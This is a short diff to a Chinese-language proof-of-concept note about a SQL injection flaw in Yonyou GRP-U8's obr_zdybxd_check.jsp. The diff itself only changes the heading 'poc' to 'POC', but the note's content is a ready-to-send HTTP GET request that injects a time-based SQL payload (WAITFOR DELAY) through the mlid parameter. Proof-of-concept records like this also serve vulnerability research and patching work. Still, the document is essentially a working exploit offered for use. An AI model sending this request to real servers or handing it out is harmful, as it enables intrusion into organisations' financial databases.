@@ -1,6 +1,6 @@
 ## 用友GRP-U8-obr_zdybxd_check存在sql注入漏洞
 
-## poc
+## POC
 ```
 GET /u8qx/obr_zdybxd_check.jsp?mlid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
 Host: xxx.xxx.xxx.xxx
